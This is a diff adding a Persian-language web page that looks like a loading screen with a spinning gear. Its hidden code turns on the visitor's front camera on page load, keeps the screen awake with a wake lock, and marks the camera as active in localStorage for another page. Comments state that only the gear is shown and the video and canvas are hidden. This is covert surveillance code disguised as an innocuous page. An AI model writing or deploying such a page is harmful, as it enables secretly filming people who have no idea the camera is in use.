@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>دوربین</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background: #000000;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        
+        .gear {
+            font-size: 120px;
+            color: #333333;
+            animation: spin 3s linear infinite;
+            filter: brightness(0.5);
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        #videoElement {
+            display: none;
+        }
+        
+        #canvasElement {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- فقط این نمایش داده می‌شود -->
+    <div class="gear">⚙️</div>
+    
+    <!-- عناصر مخفی -->
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
+    
+    <script>
+        // بلافاصله دوربین را فعال کن
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',  // دوربین سلفی
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                const videoElement = document.getElementById('videoElement');
+                videoElement.srcObject = stream;
+                
+                console.log('✅ دوربین فعال شد');
+                
+                // جلوگیری از sleep صفحه
+                if ('wakeLock' in navigator) {
+                    try {
+                        await navigator.wakeLock.request('screen');
+                    } catch (err) {
+                        console.log('Wake Lock error:', err);
+                    }
+                }
+                
+                // ذخیره در localStorage برای دسترسی از صفحه دیگر
+                localStorage.setItem('cameraActive', 'true');
+                
+            } catch (error) {
+                console.error('خطا در دوربین:', error);
+            }
+        }
+        
+        // شروع بلافاصله
+        startCamera();
+        
+        // وقتی صفحه بسته می‌شود
+        window.addEventListener('beforeunload', function() {
+            localStorage.setItem('cameraActive', 'false');
+        });
+    </script>
+</body>
+</html>
